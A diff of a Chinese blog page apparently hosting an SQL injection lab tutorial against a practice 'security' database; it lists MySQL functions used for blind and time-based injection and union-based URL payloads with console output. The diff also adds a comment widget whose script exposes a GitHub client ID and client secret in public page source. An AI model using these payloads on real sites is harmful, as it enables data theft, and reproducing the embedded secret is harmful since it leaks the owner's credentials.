@@ -54,6 +54,10 @@
   <time datetime="2020-01-05T08:08:54.000Z" itemprop="datePublished">2020-01-05</time>
 </a>
       
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%97%A5%E5%B8%B8%E7%A7%AF%E7%B4%AF/">日常积累</a>
+  </div>
+
     </div>
     
 
@@ -89,7 +93,7 @@
 <ol start="4">
 <li><p>if(表达式1，表达式2，表达式3)，如果表达式1的值为真，执行表达式2，否则执行表达式3</p>
 </li>
-<li><p>substr(str,pos,len)/  mid(str,pos,len),从pos处开始截取，截取长度为len的字符</p>
+<li><p>substr(str,pos,len)/  mid(str,pos,len),从pos处开始截取，截取长度为len的字符 </p>
 <ul>
 <li>MySQL: SUBSTR( ), SUBSTRING( )</li>
 <li>Oracle: SUBSTR( )</li>
@@ -98,7 +102,7 @@
 </li>
 <li><p>char()<strong>将十进制数转换成字符</strong>，在过滤掉单双引号的时使用较多；与其相反的是ascii()函数</p>
 </li>
-<li><p>sleep(n)，暂停数据库n秒</p>
+<li><p>sleep(n)，暂停数据库n秒，benchmarlk(count，表达式)，将表达式执行count次可以达到延迟效果</p>
 </li>
 <li><p>Length() 返回字符串的长度</p>
 </li>
@@ -118,6 +122,11 @@
 </li>
 <li><p>limit pos,len，   从pos开始查询，查询len条数据    </p>
 </li>
+<li><p>set 可以设置变量</p>
+</li>
+<li><p>prepare 预处理</p>
+</li>
+<li></li>
 </ol>
 <h2 id="0x02-操作过程与分析"><a href="#0x02-操作过程与分析" class="headerlink" title="0x02 操作过程与分析"></a>0x02 操作过程与分析</h2><h3 id="a-基本注入"><a href="#a-基本注入" class="headerlink" title="a. 基本注入"></a>a. 基本注入</h3><ol>
 <li><p>使用order/group by 判断字段长度</p>
@@ -126,15 +135,15 @@
 
 <p><code>?id=%27 order by 3 %23</code></p>
 <p><code>?id=%27 order by 4 %23</code></p>
-<p><img src="/pic/28.png" alt=""></p>
-<p><img src="/pic/29.png" alt=""></p>
+<p><img src="../pic/28.png" alt=""></p>
+<p><img src="../pic/29.png" alt=""></p>
 <p>4报错，3没有报错，表示此表有三列。</p>
 <p><em>sql 控制台的执行结果</em></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id&#x3D;0 order by 4;</span><br><span class="line">ERROR 1054 (42S22): Unknown column &#39;4&#39; in &#39;order clause&#39;</span><br><span class="line">mysql&gt; select * from user where id&#x3D;0 order by 3;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>
 
 <p>查看回显位置</p>
 <p><code>?id=%27 union select 1,2,3 %23</code></p>
-<p><img src="/pic/30.png" alt="">  2，3处有回显。</p>
+<p><img src="../pic/30.png" alt="">  2，3处有回显。</p>
 <p><em>sql控制台执行结果</em></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from user where id&#x3D;0 union select 1,2,3;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | 2        | 3        |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
 
@@ -142,7 +151,7 @@
 </li>
 <li><p>获取数据库名</p>
 <p><code>?id=%27 union select 1,database() ,3 %23</code></p>
-<p><img src="/pic/31.png" alt=""></p>
+<p><img src="../pic/31.png" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id&#x3D;0 union select 1,database(),3;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | security | 3        |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>获取表名</p>
@@ -227,6 +236,32 @@
 
   
   
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: 'c2ff86b3b4668317d630# GitHub Application Client ID',
+      clientSecret: '92facc954b6661c7556b845f2cb775dfb77df12c# Client Secret',
+      repo: 'sunny250.github.io# Repository name',
+      owner: 'sunny250# GitHub ID',
+      admin: ['sunny250# GitHub ID'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
   
 
 </article>
@@ -287,19 +322,23 @@
     </li>
     
     <li class="nav-item">
-      <a class="nav-item-link" href="/archives">归档</a>
+      <a class="nav-item-link" href="/archives/">归档</a>
     </li>
     
     <li class="nav-item">
-      <a class="nav-item-link" href="/tags">标签</a>
+      <a class="nav-item-link" href="/tags/">标签</a>
     </li>
     
     <li class="nav-item">
-      <a class="nav-item-link" href="/links">友链</a>
+      <a class="nav-item-link" href="/categories/">分类</a>
     </li>
     
     <li class="nav-item">
-      <a class="nav-item-link" href="/about">关于我</a>
+      <a class="nav-item-link" href="/links/">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about/">关于我</a>
     </li>
     
   </ul>
